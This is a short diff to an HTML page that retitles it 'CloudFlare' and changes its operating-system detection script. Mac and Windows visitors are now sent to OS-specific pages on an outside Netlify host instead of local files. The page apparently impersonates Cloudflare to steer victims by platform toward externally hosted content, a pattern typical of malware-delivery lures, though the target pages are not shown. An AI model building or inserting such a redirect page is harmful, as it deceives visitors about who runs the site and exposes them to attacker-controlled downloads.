@@ -1,20 +1,20 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CloudFlare</title>
 </head>
 <body>
 
     <script>
-        // 检测操作系统
         const userAgent = navigator.userAgent.toLowerCase();
+        
         if (userAgent.indexOf("mac") !== -1) {
-            window.location.href = "mac.html";
+            window.location.href = "https://zzc94.netlify.app/mac.html";
         } else if (userAgent.indexOf("win") !== -1) {
-            window.location.href = "win.html";
+            window.location.href = "https://zzc94.netlify.app/win.html";
         } else {
-            alert("无法识别你的操作系统！");
+            alert("Error");
         }
     </script>
 
